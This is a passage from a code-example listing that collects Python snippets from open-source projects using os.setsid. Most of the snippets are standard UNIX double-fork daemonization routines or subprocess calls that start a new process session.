From project murder, under directory dist, in source file murder_client.py.
Score: 10
vote
vote
def finished(self):
        global doneFlag
      
        self.done = True
        self.percentDone = '100'
        self.timeEst = 'Download Succeeded!'
        self.downRate = ''
        #self.display()
        
        global isPeer
        
        print "done and done"
        
        if isPeer:
          if os.fork():
            os._exit(0)
            return

          os.setsid()
          if os.fork():
            os._exit(0)
            return

          os.close(0)
          os.close(1)
          os.close(2)

          t = threading.Timer(30.0, ok_close_now)
          t.start()
        
     

 
Example 4
From project spksrc, under directory spk/subliminal/src/app, in source file scanner.py.
Score: 10
vote
vote
def daemonize(self):
        """Do the UNIX double-fork magic, see Stevens' "Advanced
        Programming in the UNIX Environment" for details (ISBN 0201563177)
        http://www.erlenstar.demon.co.uk/unix/faq_2.html#SEC16

        """
        try:
            pid = os.fork()
            if pid > 0:  # exit first parent
                sys.exit(0)
        except OSError, e:
            sys.stderr.write('Fork #1 failed: %d (%s)\n' % (e.errno, e.strerror))
            sys.exit(1)

        # decouple from parent environment
        os.chdir('/')
        os.setsid()
        os.umask(0)

        # do second fork
        try:
            pid = os.fork()
            if pid > 0:  # exit from second parent
                sys.exit(0)
        except OSError, e:
            sys.stderr.write('Fork #2 failed: %d (%s)\n' % (e.errno, e.strerror))
            sys.exit(1)
    
     
Example 5
From project spksrc, under directory spk/subliminal/src/app, in source file scheduler.py.
Score: 10
vote
vote
def daemonize(self):
        """Do the UNIX double-fork magic, see Stevens' "Advanced
        Programming in the UNIX Environment" for details (ISBN 0201563177)
        http://www.erlenstar.demon.co.uk/unix/faq_2.html#SEC16

        """
        try:
            pid = os.fork()
            if pid > 0:  # exit first parent
                sys.exit(0)
        except OSError, e:
            sys.stderr.write('Fork #1 failed: %d (%s)\n' % (e.errno, e.strerror))
            sys.exit(1)

        # decouple from parent environment
        os.chdir('/')
        os.setsid()
        os.umask(0)

        # do second fork
        try:
            pid = os.fork()
            if pid > 0:  # exit from second parent
                sys.exit(0)
        except OSError, e:
            sys.stderr.write('Fork #2 failed: %d (%s)\n' % (e.errno, e.strerror))
            sys.exit(1)

        # write pidfile
        atexit.register(self.delpid)
        file(self.pidfile, 'w+').write('%s\n' % str(os.getpid()))

     
Example 6
From project exscript, under directory src/Exscript/util, in source file daemonize.py.
Score: 10
vote
vote
def daemonize():
    """
    Forks and daemonizes the current process. Does not automatically track
    the process id; to do this, use L{Exscript.util.pidutil}.
    """
    sys.stdout.flush()
    sys.stderr.flush()

    # UNIX double-fork magic. We need to fork before any threads are
    # created.
    pid = os.fork()
    if pid > 0:
        # Exit first parent.
        sys.exit(0)

    # Decouple from parent environment.
    os.chdir('/')
    os.setsid()
    os.umask(0)

    # Now fork again.
    pid = os.fork()
    if pid > 0:
        # Exit second parent.
        sys.exit(0)

    _redirect_output(os.devnull)
 
Example 7
From project nose, under directory functional_tests/test_multiprocessing, in source file test_keyboardinterrupt.py.
Score: 10
vote
vote
def keyboardinterrupt(case):
    #os.setsid would create a process group so signals sent to the
    #parent process will propogates to all children processes
    from tempfile import mktemp
    logfile = mktemp()
    process = Popen([sys.executable,runner,os.path.join(support,case),logfile], preexec_fn=os.setsid, stdout=PIPE, stderr=PIPE, bufsize=-1)

    #wait until logfile is created:
    retry=100
    while not os.path.exists(logfile):
        sleep(0.1)
        retry -= 1
        if not retry:
            raise Exception('Timeout while waiting for log file to be created by fake_nosetest.py')

    os.killpg(process.pid, signal.SIGINT)
    return process, logfile

 
Example 8
From project taskhood, under directory django/utils, in source file daemonize.py.
Score: 10
vote
vote
def become_daemon(our_home_dir='.', out_log='/dev/null',
                      err_log='/dev/null', umask=022):
        "Robustly turn into a UNIX daemon, running in our_home_dir."
        # First fork
        try:
            if os.fork() > 0:
                sys.exit(0)     # kill off parent
        except OSError, e:
            sys.stderr.write("fork #1 failed: (%d) %s\n" % (e.errno, e.strerror))
            sys.exit(1)
        os.setsid()
        os.chdir(our_home_dir)
        os.umask(umask)

        # Second fork
        try:
            if os.fork() > 0:
                os._exit(0)
        except OSError, e:
            sys.stderr.write("fork #2 failed: (%d) %s\n" % (e.errno, e.strerror))
            os._exit(1)

        si = open('/dev/null', 'r')
        so = open(out_log, 'a+', 0)
        se = open(err_log, 'a+', 0)
        os.dup2(si.fileno(), sys.stdin.fileno())
        os.dup2(so.fileno(), sys.stdout.fileno())
        os.dup2(se.fileno(), sys.stderr.fileno())
        # Set custom file descriptors so that they get proper buffering.
        sys.stdout, sys.stderr = so, se
 
Example 9
From project sabayon, under directory admin-tool, in source file profilesdialog.py.
Score: 10
vote
vote
def start (self):
        self.user_profile_path = self.__copy_to_user (self.profile_path)
        self.temp_homedir = protosession.setup_shell_and_homedir (self.username)
        protosession.clobber_user_processes (self.username)

        display_number = protosession.find_free_display ()

        self.temp_xauth_path = self.__copy_xauthority ()

        def child_setup_fn (self):
            os.setgid (self.pw.pw_gid)
            os.setuid (self.pw.pw_uid)
            os.setsid ()
            os.umask (022)

        # FIXME: get_readable_log_config_filename() doesn't work here.
        # Create a temporary copy of the log config file and use *that*.
        argv = SESSION_TOOL_ARGV + [ ("--admin-log-config=%s" % util.get_admin_log_config_filename ()),
                                     ("--readable-log-config=%s" % util.get_readable_log_config_filename ()),
                                     self.profile_name,
                                     self.user_profile_path,
                                     str (display_number) ]
        envp = self.build_envp_for_child ()
        cwd = self.temp_homedir

        # FIXME: do we need any special processing if this throws an exception?
        # We'll catch it in the toplevel and exit with a fatal error code, anyway.
        (pid, oink, oink, oink) = gobject.spawn_async (argv, envp, cwd,
                                                       gobject.SPAWN_DO_NOT_REAP_CHILD,
                                                       child_setup_fn, self,
                                                       None, None, None)# stdin, stdout, stderr

        self.session_pid = pid;
        #self.session_stderr = os.fdopen (stderr_fd)
        #self.session_stderr_watch_id = gobject.io_add_watch (stderr_fd,
        #                                                     gobject.IO_IN | gobject.IO_HUP,
        #                                                     self.session_stderr_io_cb, self)
        self.session_child_watch = gobject.child_watch_add (self.session_pid,
                                                            self.__session_child_watch_handler)

 
Example 10
From project basket-lib, under directory packages/logilab-common, in source file daemon.py.
Score: 10
vote
vote
def daemonize(pidfile):
    # See http://www.erlenstar.demon.co.uk/unix/faq_toc.html#TOC16
    # XXX unix specific
    #
    # fork so the parent can exit
    if os.fork():   # launch child and...
        return 1
    # deconnect from tty and create a new session
    os.setsid()
    # fork again so the parent, (the session group leader), can exit.
    # as a non-session group leader, we can never regain a controlling
    # terminal.
    if os.fork():   # launch child again.
        return 1
    # move to the root to avoit mount pb
    os.chdir('/')
    # set paranoid umask
    os.umask(077) 
Example 11
From project portable-google-app-engine-sdk, under directory lib/django/django/utils, in source file daemonize.py.
Score: 10
vote
vote
def become_daemon(our_home_dir='.', out_log='/dev/null', err_log='/dev/null'):
        "Robustly turn into a UNIX daemon, running in our_home_dir."
        # First fork
        try:
            if os.fork() > 0:
                sys.exit(0)     # kill off parent
        except OSError, e:
            sys.stderr.write("fork #1 failed: (%d) %s\n" % (e.errno, e.strerror))
            sys.exit(1)
        os.setsid()
        os.chdir(our_home_dir)
        os.umask(0)

        # Second fork
        try:
            if os.fork() > 0:
                sys.exit(0)
        except OSError, e:
            sys.stderr.write("fork #2 failed: (%d) %s\n" % (e.errno, e.strerror))
            sys.exit(1)

        si = open('/dev/null', 'r')
        so = open(out_log, 'a+', 0)
        se = open(err_log, 'a+', 0)
        os.dup2(si.fileno(), sys.stdin.fileno())
        os.dup2(so.fileno(), sys.stdout.fileno())
        os.dup2(se.fileno(), sys.stderr.fileno())
 
Example 12
From project blueberrypy, under directory blueberry/utils, in source file daemonize.py.
Score: 10
vote
vote
def become_daemon():
    try:
        if os.fork() > 0:
            sys.exit(0) # kill off parent
    except OSError, e:
        sys.stderr.write('fork #1 failed: (%d) %s\n' % (e.errno, e.strerror))
        sys.exit(1)

    os.setsid()
    os.chdir('.')
    os.umask(022) 
Example 13
From project libthwap, under directory python/THWAP/os, in source file daemon.py.
Score: 10
vote
vote
def daemonize (stdin='/dev/null', stdout='/dev/null', stderr='/dev/null'):
    # Do first fork.
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)   # Exit first parent.
    except OSError, e:
        sys.stderr.write ("fork #1 failed: (%d) %s\n" % (e.errno, e.strerror) )
        sys.exit(1)
    # Decouple from parent environment.
    os.chdir("/")
    os.umask(0)
    os.setsid()
    # Do second fork.
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)   # Exit second parent.
    except OSError, e:
        sys.stderr.write ("fork #2 failed: (%d) %s\n" % (e.errno, e.strerror) )
        sys.exit(1)
    # Now I am a daemon!
    # Redirect standard file descriptors.
    si = open(stdin, 'r')
    so = open(stdout, 'a+')
    se = open(stderr, 'a+', 0)
    os.dup2(si.fileno(), sys.stdin.fileno())
    os.dup2(so.fileno(), sys.stdout.fileno())
    os.dup2(se.fileno(), sys.stderr.fileno())

 
Example 14
From project new-osm-stats, under directory , in source file graphdaemon.py.
Score: 10
vote
vote
def daemonize(self):
        try:
            pid = os.fork()
            if pid > 0:
                sys.exit(0)
        except OSError:
            log.error('Cannot enter daemon mode')
            sys.exit(-1)
        os.setsid()
        os.chdir('/')
        os.umask(0)
        try:
            pid = os.fork()
            if pid > 0:
                sys.exit(0)
        except OSError:
            log.error('Cannot enter daemon mode')
            sys.exit(-1)
        fin = open('/dev/null', 'r')
        fout = open(os.path.join(basedir, graphs_logdir, 'out'), 'a+')
        ferr = open(os.path.join(basedir, graphs_logdir, 'err'), 'a+', 0)
        os.dup2(fin.fileno(), sys.stdin.fileno())
        os.dup2(fout.fileno(), sys.stdout.fileno())
        os.dup2(ferr.fileno(), sys.stderr.fileno())

     
Example 15
From project kunai-master, under directory kunai, in source file generator.py.
Score: 10
vote
vote
def launch_command(self):
        cmd = self.g['command']
        try:
            p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, close_fds=True, preexec_fn=os.setsid)
        except Exception, exp:
            logger.error('Generator %s command launch (%s) fail : %s' % (self.g['name'], cmd, exp))
        output, err = p.communicate()
        rc = p.returncode
        if rc != 0:
            logger.error('Generator %s command launch (%s) error (rc=%s): %s' % (self.g['name'], cmd, rc, '\n'.join([output, err])))
            return
        logger.debug("Generator %s command succeded" % self.g['name'])

        
            
 
Example 16
From project kunai-master, under directory kunai, in source file cluster.py.
Score: 10
vote
vote
def launch_check(self, check):        
        rc = 3 # by default unknown state and output
        output = 'Check not configured'
        err = ''
        script = check['script']
        logger.debug("CHECK start: MACRO launching %s" % script, part='check')
        # First we need to change the script with good macros (between $$)       
        it = self.macro_pat.finditer(script)
        macros = [m.groups() for m in it]
        # can be ('$ load.warning | 95$', 'load.warning | 95') for example
        for (to_repl, m) in macros:
           change_to = self._found_params(m, check)
           script = script.replace(to_repl, change_to)
        logger.debug("MACRO finally computed", script, part='check')

        p = subprocess.Popen(script, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, close_fds=True, preexec_fn=os.setsid)
        output, err = p.communicate()
        rc = p.returncode
        # not found error like (127) should be catch as unknown check
        if rc > 3:
            rc = 3
        logger.debug("CHECK RETURN %s : %s %s %s" % (check['id'], rc, output, err), part='check')
        did_change = (check['state_id'] != rc)
        check['state'] = {0:'ok', 1:'warning', 2:'critical', 3:'unknown'}.get(rc, 'unknown')
        if 0 <= rc <= 3:
            check['state_id'] = rc
        else:
            check['state_id'] = 3

        check['output'] = output + err
        check['last_check'] = int(time.time())
        self.analyse_check(check)

        # Launch the handlers, some need the data if the element did change or not
        self.launch_handlers(check, did_change)       

    
    # get a check return and look it it did change a service state. Also save
    # the result in the __health KV
     
Example 17
From project coconut-shell, under directory , in source file setsid_helper.py.
Score: 10
vote
vote
def spawn(specs, pipe_fd, tty_fd):
    # We do not want to get killed by Ctrl-C.  We should only exit
    # when the child processes have exited.
    signal.signal(signal.SIGINT, signal.SIG_IGN)
    # We can get these signals when setting the status of child
    # processes.  Ignore them otherwise we'll get wedged!
    signal.signal(signal.SIGTTIN, signal.SIG_IGN)
    signal.signal(signal.SIGTTOU, signal.SIG_IGN)

    pipe = os.fdopen(pipe_fd, "w", 0)
    # Detach from controlling tty and create new session.
    os.setsid()
    # Set controlling tty.
    fcntl.ioctl(tty_fd, termios.TIOCSCTTY, 0)
    pgroup = shell_spawn.ProcessGroup(True, NonOwningFDWrapper(tty_fd))
    pids = []
    for spec in specs:
        spec["pgroup"] = pgroup
        spec["fds"] = dict((dest_fd, NonOwningFDWrapper(fd))
                            for dest_fd, fd in spec["fds"].iteritems())
        pids.append(shell_spawn.spawn_subprocess(spec))
    shell_spawn.close_fds([pipe_fd])
    os.chdir("/") # Don't keep directory FD alive via cwd.
    pipe.write("%s\n" % repr(pids))
    while True:
        try:
            pid, status = os.waitpid(-1, os.WUNTRACED)
        except OSError:
            break
        pipe.write("%s\n" % repr((pid, status)))


 
Example 18
From project tizen-distro-master, under directory meta/lib/oeqa/controllers, in source file masterimage.py.
Score: 10
vote
vote
def power_ctl(self, msg):
        if self.powercontrol_cmd:
            cmd = "%s %s" % (self.powercontrol_cmd, msg)
            try:
                commands.runCmd(cmd, assert_error=False, preexec_fn=os.setsid, env=self.origenv)
            except CommandError as e:
                bb.fatal(str(e))

     
Example 19
From project tizen-distro-master, under directory meta/lib/oeqa/utils, in source file sshcontrol.py.
Score: 10
vote
vote
def __init__(self, **options):

        self.defaultopts = {
            "stdout": subprocess.PIPE,
            "stderr": subprocess.STDOUT,
            "stdin": None,
            "shell": False,
            "bufsize": -1,
            "preexec_fn": os.setsid,
        }
        self.options = dict(self.defaultopts)
        self.options.update(options)
        self.status = None
        self.output = None
        self.process = None
        self.starttime = None
        self.logfile = None

     
Example 20
From project b3-configmanager, under directory urwid, in source file web_display.py.
Score: 10
vote
vote
def daemonize( errfile ):
    """
    Detach process and become a daemon.
    """
    pid = os.fork()
    if pid:
        os._exit(0)

    os.setsid()
    signal.signal(signal.SIGHUP, signal.SIG_IGN)
    os.umask(0)

    pid = os.fork()
    if pid:
        os._exit(0)

    os.chdir("/")
    for fd in range(0,20):
        try:
            os.close(fd)
        except OSError:
            pass

    sys.stdin = open("/dev/null","r")
    sys.stdout = open("/dev/null","w")
    sys.stderr = ErrorLog( errfile )

 
Example 21
From project celery, under directory celery, in source file platforms.py.
Score: 10
vote
vote
def _detach(self):
        if os.fork() == 0:      # first child
            os.setsid()         # create new session
            if os.fork() > 0:   # second child
                os._exit(0)
        else:
            os._exit(0)
        return self


 
Example 22
From project FunkLoad, under directory src/funkload, in source file utils.py.
Score: 10
vote
vote
def create_daemon():
    """Detach a process from the controlling terminal and run it in the
    background as a daemon.
    """
    try:
        pid = os.fork()
    except OSError, msg:
        raise Exception, "%s [%d]" % (msg.strerror, msg.errno)
    if (pid == 0):
        os.setsid()
        try:
            pid = os.fork()
        except OSError, msg:
            raise Exception, "%s [%d]" % (msg.strerror, msg.errno)
        if (pid == 0):
            os.umask(0)
        else:
            os._exit(0)
    else:
        sleep(.5)
        os._exit(0)
    import resource
    maxfd = resource.getrlimit(resource.RLIMIT_NOFILE)[1]
    if (maxfd == resource.RLIM_INFINITY):
        maxfd = 1024
    for fd in range(0, maxfd):
        try:
            os.close(fd)
        except OSError:
            pass
    os.open('/dev/null', os.O_RDWR)
    os.dup2(0, 1)
    os.dup2(0, 2)
    return(0)


# ------------------------------------------------------------
# meta method name encodage
#
 
Example 23
From project borg-master, under directory borg, in source file helpers.py.
Score: 10
vote
vote
def daemonize():
    """Detach process from controlling terminal and run in background
    """
    pid = os.fork()
    if pid:
        os._exit(0)
    os.setsid()
    pid = os.fork()
    if pid:
        os._exit(0)
    os.chdir('/')
    os.close(0)
    os.close(1)
    os.close(2)
    fd = os.open('/dev/null', os.O_RDWR)
    os.dup2(fd, 0)
    os.dup2(fd, 1)
    os.dup2(fd, 2)


 
Example 24
From project thinkpad-tools, under directory thinkpad, in source file Daemon.py.
Score: 10
vote
vote
def start(self):
		if self.running():
			return
		try:
			if os.fork() > 0: os._exit(0)
		except OSError, error:
			sys.stderr.write("fork #1 failed: %d (%s)\n" % (error.errno, error.strerror))
			os._exit(1)
		
		os.chdir('/')
		os.setsid()
		os.umask(0)
		
		try:
			pid = os.fork()
			if pid > 0:
				return
		except OSError, error:
			sys.stderr.write("fork #2 failed: %d (%s)\n" % (error.errno, error.strerror))
			os._exit(1)
		
		atexit.register(os.unlink, self.__pidFile)
		burp(self.__pidFile, '%d' % os.getpid())
		self.run()
		os.unlink(self.__pidFile)
		os._exit(0)

	 
Example 25
From project sinanet.gelso, under directory PasteScript-1.7.5-py2.7.egg/paste/script, in source file serve.py.
Score: 8
vote
vote
def daemonize(self):
        pid = live_pidfile(self.options.pid_file)
        if pid:
            raise DaemonizeException(
                "Daemon is already running (PID: %s from PID file %s)"
                % (pid, self.options.pid_file))

        if self.verbose > 0:
            print 'Entering daemon mode'
        pid = os.fork()
        if pid:
            # The forked process also has a handle on resources, so we
            # *don't* want proper termination of the process, we just
            # want to exit quick (which os._exit() does)
            os._exit(0)
        # Make this the session leader
        os.setsid()
        # Fork again for good measure!
        pid = os.fork()
        if pid:
            os._exit(0)

        # @@: Should we set the umask and cwd now?

        import resource  # Resource usage information.
        maxfd = resource.getrlimit(resource.RLIMIT_NOFILE)[1]
        if (maxfd == resource.RLIM_INFINITY):
            maxfd = MAXFD
        # Iterate through and close all file descriptors.
        for fd in range(0, maxfd):
            try:
                os.close(fd)
            except OSError:  # ERROR, fd wasn't open to begin with (ignored)
                pass

        if (hasattr(os, "devnull")):
            REDIRECT_TO = os.devnull
        else:
            REDIRECT_TO = "/dev/null"
        os.open(REDIRECT_TO, os.O_RDWR)  # standard input (0)
        # Duplicate standard input to standard output and standard error.
        os.dup2(0, 1)  # standard output (1)
        os.dup2(0, 2)  # standard error (2)

     
Example 26
From project aandete, under directory app/lib/python/paste/script, in source file serve.py.
Score: 8
vote
vote
def daemonize(self):
        pid = live_pidfile(self.options.pid_file)
        if pid:
            raise DaemonizeException(
                "Daemon is already running (PID: %s from PID file %s)"
                % (pid, self.options.pid_file))

        if self.verbose > 0:
            print 'Entering daemon mode'
        pid = os.fork()
        if pid:
            # The forked process also has a handle on resources, so we
            # *don't* want proper termination of the process, we just
            # want to exit quick (which os._exit() does)
            os._exit(0)
        # Make this the session leader
        os.setsid()
        # Fork again for good measure!
        pid = os.fork()
        if pid:
            os._exit(0)

        # @@: Should we set the umask and cwd now?

        import resource  # Resource usage information.
        maxfd = resource.getrlimit(resource.RLIMIT_NOFILE)[1]
        if (maxfd == resource.RLIM_INFINITY):
            maxfd = MAXFD
        # Iterate through and close all file descriptors.
        for fd in range(0, maxfd):
            try:
                os.close(fd)
            except OSError:  # ERROR, fd wasn't open to begin with (ignored)
                pass

        if (hasattr(os, "devnull")):
            REDIRECT_TO = os.devnull
        else:
            REDIRECT_TO = "/dev/null"
        os.open(REDIRECT_TO, os.O_RDWR)  # standard input (0)
        # Duplicate standard input to standard output and standard error.
        os.dup2(0, 1)  # standard output (1)
        os.dup2(0, 2)  # standard error (2)
        
     
Example 27
From project Gamez, under directory cherrypy/process, in source file plugins.py.
Score: 8
vote
vote
def start(self):
        if self.finalized:
            self.bus.log('Already deamonized.')
        
        # forking has issues with threads:
        # http://www.opengroup.org/onlinepubs/000095399/functions/fork.html
        # "The general problem with making fork() work in a multi-threaded
        #  world is what to do with all of the threads..."
        # So we check for active threads:
        if threading.activeCount() != 1:
            self.bus.log('There are %r active threads. '
                         'Daemonizing now may cause strange failures.' %
                         threading.enumerate(), level=30)
        
        # See http://www.erlenstar.demon.co.uk/unix/faq_2.html#SEC16
        # (or http://www.faqs.org/faqs/unix-faq/programmer/faq/ section 1.7)
        # and http://aspn.activestate.com/ASPN/Cookbook/Python/Recipe/66012
        
        # Finish up with the current stdout/stderr
        sys.stdout.flush()
        sys.stderr.flush()
        
        # Do first fork.
        try:
            pid = os.fork()
            if pid == 0:
                # This is the child process. Continue.
                pass
            else:
                # This is the first parent. Exit, now that we've forked.
                self.bus.log('Forking once.')
                os._exit(0)
        except OSError:
            # Python raises OSError rather than returning negative numbers.
            exc = sys.exc_info()[1]
            sys.exit("%s: fork #1 failed: (%d) %s\n"
                     % (sys.argv[0], exc.errno, exc.strerror))
        
        os.setsid()
        
        # Do second fork
        try:
            pid = os.fork()
            if pid > 0:
                self.bus.log('Forking twice.')
                os._exit(0) # Exit second parent
        except OSError:
            exc = sys.exc_info()[1]
            sys.exit("%s: fork #2 failed: (%d) %s\n"
                     % (sys.argv[0], exc.errno, exc.strerror))
        
        os.chdir("/")
        os.umask(0)
        
        si = open(self.stdin, "r")
        so = open(self.stdout, "a+")
        se = open(self.stderr, "a+")

        # os.dup2(fd, fd2) will close fd2 if necessary,
        # so we don't explicitly close stdin/out/err.
        # See http://docs.python.org/lib/os-fd-ops.html
        os.dup2(si.fileno(), sys.stdin.fileno())
        os.dup2(so.fileno(), sys.stdout.fileno())
        os.dup2(se.fileno(), sys.stderr.fileno())
        
        self.bus.log('Daemonized to PID: %s' % os.getpid())
        self.finalized = True
     
Example 28
From project django-collector, under directory collector/helpers, in source file daemon.py.
Score: 8
vote
vote
def daemonize(self):
		"""
		do the UNIX double-fork magic, see Stevens' "Advanced 
		Programming in the UNIX Environment" for details (ISBN 0201563177)
		http://www.erlenstar.demon.co.uk/unix/faq_2.html#SEC16
		"""
		try: 
			pid = os.fork() 
			if pid > 0:
				# exit first parent
				sys.exit(0) 
		except OSError, e: 
			sys.stderr.write("fork #1 failed: %d (%s)\n" % (e.errno, e.strerror))
			sys.exit(1)
	
		# decouple from parent environment
		os.chdir("/") 
		os.setsid() 
		os.umask(0) 
	
		# do second fork
		try: 
			pid = os.fork() 
			if pid > 0:
				# exit from second parent
				sys.exit(0) 
		except OSError, e: 
			sys.stderr.write("fork #2 failed: %d (%s)\n" % (e.errno, e.strerror))
			sys.exit(1) 
	
		# redirect standard file descriptors
		sys.stdout.flush()
		sys.stderr.flush()
		si = file(self.stdin, 'r')
		so = file(self.stdout, 'a+')
		se = file(self.stderr, 'a+', 0)
		os.dup2(si.fileno(), sys.stdin.fileno())
		os.dup2(so.fileno(), sys.stdout.fileno())
		os.dup2(se.fileno(), sys.stderr.fileno())
	
		# write pidfile
		atexit.register(self.delpid)
		pid = str(os.getpid())
		file(self.pidfile,'w+').write("%s\n" % pid)
	
	 
Example 29
From project Sick-Beard, under directory cherrypy/process, in source file plugins.py.
Score: 8
vote
vote
def start(self):
        if self.finalized:
            self.bus.log('Already deamonized.')
        
        # forking has issues with threads:
        # http://www.opengroup.org/onlinepubs/000095399/functions/fork.html
        # "The general problem with making fork() work in a multi-threaded
        #  world is what to do with all of the threads..."
        # So we check for active threads:
        if threading.activeCount() != 1:
            self.bus.log('There are %r active threads. '
                         'Daemonizing now may cause strange failures.' % 
                         threading.enumerate(), level=30)
        
        # See http://www.erlenstar.demon.co.uk/unix/faq_2.html#SEC16
        # (or http://www.faqs.org/faqs/unix-faq/programmer/faq/ section 1.7)
        # and http://aspn.activestate.com/ASPN/Cookbook/Python/Recipe/66012
        
        # Finish up with the current stdout/stderr
        sys.stdout.flush()
        sys.stderr.flush()
        
        # Do first fork.
        try:
            pid = os.fork()
            if pid == 0:
                # This is the child process. Continue.
                pass
            else:
                # This is the first parent. Exit, now that we've forked.
                self.bus.log('Forking once.')
                os._exit(0)
        except OSError, exc:
            # Python raises OSError rather than returning negative numbers.
            sys.exit("%s: fork #1 failed: (%d) %s\n"
                     % (sys.argv[0], exc.errno, exc.strerror))
        
        os.setsid()
        
        # Do second fork
        try:
            pid = os.fork()
            if pid > 0:
                self.bus.log('Forking twice.')
                os._exit(0) # Exit second parent
        except OSError, exc:
            sys.exit("%s: fork #2 failed: (%d) %s\n"
                     % (sys.argv[0], exc.errno, exc.strerror))
        
        os.chdir("/")
        os.umask(0)
        
        si = open(self.stdin, "r")
        so = open(self.stdout, "a+")
        se = open(self.stderr, "a+")

        # os.dup2(fd, fd2) will close fd2 if necessary,
        # so we don't explicitly close stdin/out/err.
        # See http://docs.python.org/lib/os-fd-ops.html
        os.dup2(si.fileno(), sys.stdin.fileno())
        os.dup2(so.fileno(), sys.stdout.fileno())
        os.dup2(se.fileno(), sys.stderr.fileno())
        
        self.bus.log('Daemonized to PID: %s' % os.getpid())
        self.finalized = True
     
Example 30
From project ClusterNap, under directory bin, in source file daemon3x.py.
Score: 8
vote
vote
def daemonize(self):
		"""Deamonize class. UNIX double fork mechanism."""

		try: 
			pid = os.fork() 
			if pid > 0:
				# exit first parent
				sys.exit(0) 
		except OSError as err: 
			sys.stderr.write('fork #1 failed: {0}\n'.format(err))
			sys.exit(1)
	
		# decouple from parent environment
		os.chdir('/') 
		os.setsid() 
		os.umask(0) 
	
		# do second fork
		try: 
			pid = os.fork() 
			if pid > 0:

				# exit from second parent
				sys.exit(0) 
		except OSError as err: 
			sys.stderr.write('fork #2 failed: {0}\n'.format(err))
			sys.exit(1) 
	
		# redirect standard file descriptors
		sys.stdout.flush()
		sys.stderr.flush()
		si = open(os.devnull, 'r')
		so = open(os.devnull, 'a+')
		se = open(os.devnull, 'a+')

		os.dup2(si.fileno(), sys.stdin.fileno())
		os.dup2(so.fileno(), sys.stdout.fileno())
		os.dup2(se.fileno(), sys.stderr.fileno())
	
		# write pidfile
		atexit.register(self.delpid)

		pid = str(os.getpid())
		with open(self.pidfile,'w+') as f:
			f.write(pid + '\n')
	
	 
Example 31
From project basket-lib, under directory packages/mercurial/mercurial, in source file cmdutil.py.
Score: 8
vote
vote
def service(opts, parentfn=None, initfn=None, runfn=None, logfile=None,
    runargs=None, appendpid=False):
    '''Run a command as a service.'''

    if opts['daemon'] and not opts['daemon_pipefds']:
        # Signal child process startup with file removal
        lockfd, lockpath = tempfile.mkstemp(prefix='hg-service-')
        os.close(lockfd)
        try:
            if not runargs:
                runargs = util.hgcmd() + sys.argv[1:]
            runargs.append('--daemon-pipefds=%s' % lockpath)
            # Don't pass --cwd to the child process, because we've already
            # changed directory.
            for i in xrange(1, len(runargs)):
                if runargs[i].startswith('--cwd='):
                    del runargs[i]
                    break
                elif runargs[i].startswith('--cwd'):
                    del runargs[i:i + 2]
                    break
            def condfn():
                return not os.path.exists(lockpath)
            pid = util.rundetached(runargs, condfn)
            if pid < 0:
                raise util.Abort(_('child process failed to start'))
        finally:
            try:
                os.unlink(lockpath)
            except OSError, e:
                if e.errno != errno.ENOENT:
                    raise
        if parentfn:
            return parentfn(pid)
        else:
            return

    if initfn:
        initfn()

    if opts['pid_file']:
        mode = appendpid and 'a' or 'w'
        fp = open(opts['pid_file'], mode)
        fp.write(str(os.getpid()) + '\n')
        fp.close()

    if opts['daemon_pipefds']:
        lockpath = opts['daemon_pipefds']
        try:
            os.setsid()
        except AttributeError:
            pass
        os.unlink(lockpath)
        util.hidewindow()
        sys.stdout.flush()
        sys.stderr.flush()

        nullfd = os.open(util.nulldev, os.O_RDWR)
        logfilefd = nullfd
        if logfile:
            logfilefd = os.open(logfile, os.O_RDWR | os.O_CREAT | os.O_APPEND)
        os.dup2(nullfd, 0)
        os.dup2(logfilefd, 1)
        os.dup2(logfilefd, 2)
        if nullfd not in (0, 1, 2):
            os.close(nullfd)
        if logfile and logfilefd not in (0, 1, 2):
            os.close(logfilefd)

    if runfn:
        return runfn()

 
Example 32
From project amonone, under directory amonone/web/libs, in source file daemon.py.
Score: 8
vote
vote
def daemonize(self):
		"""
		do the UNIX double-fork magic, see Stevens' "Advanced 
		Programming in the UNIX Environment" for details (ISBN 0201563177)
		http://www.erlenstar.demon.co.uk/unix/faq_2.html#SEC16
		"""
		try: 
				pid = os.fork() 
				if pid > 0:
						# exit first parent
						sys.exit(0) 
		except OSError, e: 
				sys.stderr.write("fork #1 failed: %d (%s)\n" % (e.errno, e.strerror))
				sys.exit(1)

		# decouple from parent environment
		os.chdir(".") 
		os.setsid() 
		os.umask(0) 

		# do second fork
		try: 
			pid = os.fork() 
			if pid > 0:
				# exit from second parent
				sys.exit(0) 
		except OSError, e: 
			sys.stderr.write("fork #2 failed: %d (%s)\n" % (e.errno, e.strerror))
			sys.exit(1) 
		
		# redirect standard file descriptors
		si = file(self.stdin, 'r')
		so = file(self.stdout, 'a+')
		se = file(self.stderr, 'a+', 0)
		
		pid = str(os.getpid())
		
		sys.stderr.write("\n%s\n" % self.startmsg % pid)
		sys.stderr.flush()

		if self.pidfile:
			file(self.pidfile,'w+').write("%s\n" % pid)
		
		atexit.register(self.delpid)
		os.dup2(si.fileno(), sys.stdin.fileno())
		os.dup2(so.fileno(), sys.stdout.fileno())
		os.dup2(se.fileno(), sys.stderr.fileno())
			
		
		

	 
Example 33
From project alfred-ramda-workflow-master, under directory workflow, in source file background.py.
Score: 8
vote
vote
def _background(stdin='/dev/null', stdout='/dev/null',
                stderr='/dev/null'):  # pragma: no cover
    """Fork the current process into a background daemon.

    :param stdin: where to read input
    :type stdin: filepath
    :param stdout: where to write stdout output
    :type stdout: filepath
    :param stderr: where to write stderr output
    :type stderr: filepath

    """

    # Do first fork.
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)  # Exit first parent.
    except OSError as e:
        wf().logger.critical("fork #1 failed: ({0:d}) {1}".format(
                             e.errno, e.strerror))
        sys.exit(1)
    # Decouple from parent environment.
    os.chdir(wf().workflowdir)
    os.umask(0)
    os.setsid()
    # Do second fork.
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)  # Exit second parent.
    except OSError as e:
        wf().logger.critical("fork #2 failed: ({0:d}) {1}".format(
                             e.errno, e.strerror))
        sys.exit(1)
    # Now I am a daemon!
    # Redirect standard file descriptors.
    si = file(stdin, 'r', 0)
    so = file(stdout, 'a+', 0)
    se = file(stderr, 'a+', 0)
    if hasattr(sys.stdin, 'fileno'):
